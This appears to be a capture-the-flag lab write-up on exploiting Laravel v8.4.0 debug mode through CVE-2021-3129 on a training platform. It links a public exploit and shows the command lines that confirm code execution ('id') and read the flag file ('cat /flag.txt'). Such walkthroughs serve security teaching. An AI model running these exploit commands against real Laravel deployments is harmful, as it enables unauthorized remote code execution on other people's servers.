---
title: any
type: writeup
category: Infinity Learning
platform: Infinity Learning
difficulty: Easy
os: Linux
date: 2026-05-17
tags:
  - CVE-2021-3129
  - Laravel
  - RCE
  - Debug Mode
summary: Exploiting Laravel debug mode to achieve Remote Code Execution via CVE-2021-3129.
initialAccess: RCE via Laravel debug mode deserialization vulnerability (CVE-2021-3129).
privesc: Direct flag retrieval through Remote Code Execution.
---

# any

First, we have a URL for the target:
`https://red.infinity.cyberwarfare.live/n7330234b66a452dbd91854cc722851p`

Let's examine it.

![image.png](image.png)

Not much going on, but there's a version number visible — and it's the latest release. Hitting `Ctrl+U` to view the source code revealed something interesting:

![image.png](image%201.png)

The app is still in debug mode, with another path pointing to the real running instance. Time to look for vulnerabilities for this version.

> Laravel **v8.4.0** is affected by several critical vulnerabilities, most notably an RCE flaw that triggers when debug mode is enabled.
> https://github.com/joshuavanderpoll/CVE-2021-3129

Nice ;)

After installing the exploit and its requirements, let's run it:

```bash
❯ python3 CVE-2021-3129.py --host https://red.infinity.cyberwarfare.live/n7330234b66a452dbd91854cc722851p 
```

![image.png](image%202.png)

Target is vulnerable. Let's confirm code execution:

```bash
❯ python3 CVE-2021-3129.py --host https://red.infinity.cyberwarfare.live/n7330234b66a452dbd91854cc722851p --force --exec "id"
```

![image.png](image%203.png)

I wanted to pop a shell, but didn't have time — so I grabbed the flag directly through the exploit instead.

\-\_-

```bash
❯ python3 CVE-2021-3129.py --host https://red.infinity.cyberwarfare.live/n7330234b66a452dbd91854cc722851p --force --exec "cat /flag.txt"
```

![image.png](image%204.png)

https://infinity.cyberwarfare.live/on_premise/onpremise_offensive/challenges/67e56221840203741a9c284d

![image.png](image%205.png)